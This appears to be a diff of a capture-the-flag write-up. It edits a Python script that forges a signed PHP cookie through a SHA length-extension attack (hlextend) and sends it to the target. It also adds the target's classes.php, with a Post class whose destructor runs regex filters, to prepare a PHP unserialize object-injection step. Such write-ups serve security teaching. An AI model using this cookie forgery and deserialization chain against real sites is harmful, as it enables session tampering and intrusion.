@@ -48,7 +48,7 @@ import hlextend
 import requests
 import subprocess
 
-def encode(s):
+def php_urlencode(s):
     '''Return php urlencoded string'''
     print "ENCODE: " + s
     s = s.replace("\x00", "\0")
@@ -72,7 +72,7 @@ cookie = sha.extend(appended_data, original_data, key_length, original_hash)
 cookie_hash = sha.hexdigest()
 
 # Send a request with our new cookie to verify our method works
-output = encode(cookie)
+output = php_urlencode(cookie)
 cookies = {'custom_settings_hash': cookie_hash,
            'custom_settings': output}
 print requests.get(url, cookies=cookies).text
@@ -96,6 +96,64 @@ Because we see the HTML for the home page, we know that our cookie creation work
 Now, what can we do with this new cookie creation?
 
 ## Unserialize object creation
+
+Let's take a quick look at the `classes.php` file:
+```php
+$ cat steves_list_backup/includes/classes.php 
+<?php
+  class Filter {
+    protected $pattern;
+    protected $repl;
+    function __construct($pattern, $repl) {
+      $this->pattern = $pattern;
+      $this->repl = $repl;
+    }
+    function filter($data) {
+      return preg_replace($this->pattern, $this->repl, $data);
+    }
+  };
+
+  class Post {
+    protected $title;
+    protected $text;
+    protected $filters;
+    function __construct($title, $text, $filters) {
+      $this->title = $title;
+      $this->text = $text;
+      $this->filters = $filters;
+    }
+
+    function get_title() {
+      return htmlspecialchars($this->title);
+    }
+
+    function display_post() {
+      $text = htmlspecialchars($this->text);
+      foreach ($this->filters as $filter)
+        $text = $filter->filter($text);
+      return $text;
+    }
+
+    function __destruct() {
+      // debugging stuff
+      $s = "<!-- POST " . htmlspecialchars($this->title);
+      $text = htmlspecialchars($this->text);
+      foreach ($this->filters as $filter)
+        $text = $filter->filter($text);
+      $s = $s . ": " . $text;
+      $s = $s . " -->";
+      echo $s;
+    }
+  };
+
+  $standard_filter_set = [new Filter("/\[i\](.*)\[\/i\]/i", "<i>\\1</i>"),
+                          new Filter("/\[b\](.*)\[\/b\]/i", "<b>\\1</b>"),
+                          new Filter("/\[img\](.*)\[\/img\]/i", "<img src='\\1'>"),
+                          new Filter("/\[br\]/i", "<br>")];
+?>
+```
+
+We have a *Post* class that contains the **title** of a post, the **text** of a post, and **filters** on a post to essentially write markdown-style data without having to worry about html tags (or at least that was the intended purpose ;-)
 
 ```php
 <?php
